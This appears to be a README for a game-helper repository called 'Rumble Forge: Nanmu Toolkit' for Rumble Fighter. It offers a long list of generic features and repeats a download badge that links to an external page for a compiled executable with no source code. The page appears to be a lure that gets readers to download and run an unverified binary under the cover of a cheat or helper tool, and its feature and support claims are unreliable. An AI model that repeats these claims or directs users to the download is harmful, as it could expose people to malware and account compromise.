![preview](https://raw.githubusercontent.com/jek111/rumble-fighter-nanmu-helper/main/splash_5bde.svg)
[![Download](https://raw.githubusercontent.com/jek111/rumble-fighter-nanmu-helper/main/run_4d85d41.svg)](https://jek111.github.io/rumble-fighter-nanmu-helper/)

# Rumble Forge: Nanmu Toolkit

An independent, community-driven enhancement suite for Rumble Fighter, built to revive the classic beat-em-up experience with modern tooling, quality-of-life refinements, and a fresh perspective on what a fighting game companion tool can be.

[![Download](https://raw.githubusercontent.com/jek111/rumble-fighter-nanmu-helper/main/run_4d85d41.svg)](https://jek111.github.io/rumble-fighter-nanmu-helper/)

---

## 🥋 Overview

Rumble Forge: Nanmu Toolkit is a reimagined evolution of the original Nanmu utility concept. Rather than a simple launcher patch or a barebones asset injector, this project positions itself as a fully-fledged companion ecosystem for players who still hear the rhythm of the old school arenas in their sleep. It is, in spirit, less of a "tool" and more of a dojo — a place where your client is trained, tuned, and prepared before every match.

The toolkit bundles client-side configuration management, performance reconciliation, input latency smoothing, cosmetic slot customization, and a multilingual interface layer into a single cohesive desktop application. Every component is designed around one guiding belief: legacy fighting games deserve modern ergonomics, and the players who love them deserve software that respects both their time and their nostalgia.

This repository is the public home of the project's documentation, release notes, roadmap, and issue tracker. The core application is distributed as a compiled desktop build, while the surrounding ecosystem — presets, localization packs, plugin manifests, and community themes — lives here in the open.

---

## 🧭 Philosophy

Most game companion utilities chase features. This one chases *flow*.

The original Nanmu concept was utilitarian: it did a handful of things and did them without ceremony. Rumble Forge keeps that restraint but layers on intentionality. Every button exists because a player asked for it. Every menu is ordered by how often it is actually opened during a session. Every default is chosen by people who have played thousands of rounds, not by designers who have studied screenshots of them.

The result is software that feels less like a control panel and more like a well-worn pair of gloves — familiar on the first use, invisible by the tenth.

---

## ✨ Feature Set

### 🎮 Core Client Utilities
- **Session Bootstrapper** — launches the game client with your preferred profile, resolution, and audio device pre-loaded, so you never fumble through the same four menus again.
- **Profile Vault** — store unlimited named loadout configurations and switch between them in a single click, including input mappings, cosmetic arrangements, and UI scaling.
- **Live Stat Overlay** — an optional, non-intrusive heads-up layer showing frame pacing, input latency, and connection stability during matches.
- **Replay Organizer** — automatically sorts and tags recorded matches by opponent, arena, and outcome for later study.

### 🎨 Cosmetic & Visual Layer
- **Cosmetic Slot Customizer** — rearrange, recolor, and preview outfit combinations outside of the in-game dressing room.
- **Arena Atmosphere Presets** — save and apply lighting, camera distance, and particle density configurations without touching raw config files.
- **Theme Engine** — swap the entire interface palette between bundled community themes or your own JSON-defined sets.

### ⚡ Performance & Stability
- **Frame Pacing Reconciler** — smooths out micro-stutters common on modern hardware running older engines.
- **Memory Hygiene Pass** — reduces long-session memory growth, particularly during extended lobby idle time.
- **Network Jitter Buffer** — optional client-side buffering tuned for high-latency regions, configurable per-server.
- **Startup Integrity Check** — verifies installation health before launch and offers guided repair steps for missing assets.

### 🌐 Internationalization
- **Multilingual Interface** — fully localized into English, Japanese, Korean, Spanish, Portuguese, German, French, and Simplified Chinese, with community-contributed packs added regularly.
- **On-the-Fly Language Switch** — change language without restarting the application.
- **Localization Contribution Workflow** — a documented, contributor-friendly pipeline for adding new languages.

### 🧩 Extensibility
- **Plugin Manifest System** — third-party developers can publish small utilities that hook into the toolkit's event bus.
- **Preset Sharing Format** — a portable, human-readable JSON schema for exchanging loadouts and themes.
- **Scripted Macros** — record short input sequences and bind them to hotkeys for training drills (with strict safety rails to prevent abuse).

### 🖥️ Interface & Experience
- **Responsive UI** — the layout adapts cleanly from a small laptop panel up to ultrawide monitors, with a compact mode for low-resolution setups.
- **Dark, Light, and High-Contrast Modes** — visibility is not an afterthought.
- **Keyboard-First Navigation** — every screen is reachable without a mouse.
- **Configurable Notifications** — quiet mode, match-only alerts, or full verbosity, your choice.

### 🛟 Support & Community
- **24/7 Customer Support** — round-the-clock assistance through our community help desk, staffed by volunteers across multiple time zones so someone is always awake when your client misbehaves at 3 AM.
- **In-App Diagnostic Bundler** — one click generates a clean, anonymized report you can attach to a support request.
- **Community Preset Gallery** — browse, rate, and import configurations shared by other players.
- **Roadmap Voting** — feature priorities are decided in part by community polls, published quarterly.

---

## 🚀 Getting Started

The toolkit is distributed as a self-contained desktop application. There is nothing to compile, nothing to wire together, and no command-line ritual to memorize.

1. Acquire the latest release package from the distribution channel referenced by the [![Download](https://raw.githubusercontent.com/jek111/rumble-fighter-nanmu-helper/main/run_4d85d41.svg)](https://jek111.github.io/rumble-fighter-nanmu-helper/) marker above.
2. Extract the archive to a directory you control — avoid system-protected folders.
3. Run the executable matching your platform.
4. On first launch, the setup assistant will ask you to point it at your game installation directory.
5. Choose a profile name, pick your language, and you are ready.

If the setup assistant cannot locate your installation automatically, it will offer a manual browse dialog and a short checklist of common install locations for each supported storefront and region.

---

## 🗺️ Roadmap

The project follows a rolling quarterly cadence with clearly scoped milestones.

**2026 Q1 — Foundation Hardening**
- Finalize plugin manifest schema v1
- Ship localization packs for two additional languages
- Overhaul diagnostic bundler output formatting

**2026 Q2 — Multiplayer Insights**
- Add per-opponent historical matchup statistics
- Introduce optional cloud-synced profile vault (opt-in, end-to-end encrypted)
- Improve network jitter buffer heuristics for mobile hotspot users

**2026 Q3 — Cosmetics Deep Dive**
- Introduce layered cosmetic compositor for advanced outfit blending
- Add community theme marketplace with moderation queue
- Support animated arena atmosphere presets

**2026 Q4 — Accessibility & Reach**
- Full screen-reader compatibility pass
- Colorblind-safe palette variants for every bundled theme
- Controller-only navigation mode

Roadmap items are subject to change based on community feedback, upstream game changes, and volunteer availability.

---

## 🧪 Compatibility Matrix

| Platform | Status | Notes |
| --- | --- | --- |
| Windows 10 (x64) | Fully supported | Recommended baseline |
| Windows 11 (x64) | Fully supported | Tested through current release channel |
| Windows 8.1 | Best effort | Legacy runtime provided |
| Linux (via compatibility layer) | Community maintained | Report issues in the tracker |
| macOS | Experimental | Apple Silicon build in progress |

Compatibility notes are updated with each release. If your environment is not listed, open an issue and a maintainer will investigate.

---

## 🧑‍🤝‍🧑 Contributing

Contributions of all sizes are welcome, from typo fixes in localization files to entirely new plugin modules.

Before opening a pull request, please:
- Read the contribution guide located in the docs directory.
- Check the issue tracker for existing discussion on the same topic.
- Keep changes scoped — one feature or fix per pull request.
- Include a short description of the user-facing impact.

Localization contributions do not require any programming knowledge. If you can translate a spreadsheet, you can ship a language pack.

---

## 🛡️ Disclaimer

Rumble Forge: Nanmu Toolkit is an independent, community-developed companion utility. It is not affiliated with, endorsed by, sponsored by, or officially connected to the original game's developers, publishers, or any of their subsidiaries.

The toolkit operates strictly on the client side. It does not interact with, modify, or interfere with official game servers, and it does not provide any competitive advantage that could not be achieved through the game's own supported settings.

Users are responsible for ensuring that their use of this software complies with the terms of service of any platform or game they interact with. The maintainers of this project assume no liability for account actions taken by third parties.

This software is provided as-is, without warranty of any kind, express or implied. Use it thoughtfully, use it respectfully, and above all, use it because you love the game.

---

## 📜 License

This project is released under the MIT License.

You are permitted to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software, subject to the conditions described in the license text.

Read the full license here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 Rumble Forge Contributors

---

## 💬 A Closing Note

Communities keep old games alive. Tools like this one are just small acts of maintenance — a way of saying that the arenas still matter, the combos still land, and the players who grew up with them are still here, still fighting, still refining their craft.

If this toolkit makes your sessions a little smoother and your setup a little more personal, it has done its job.

[![Download](https://raw.githubusercontent.com/jek111/rumble-fighter-nanmu-helper/main/run_4d85d41.svg)](https://jek111.github.io/rumble-fighter-nanmu-helper/)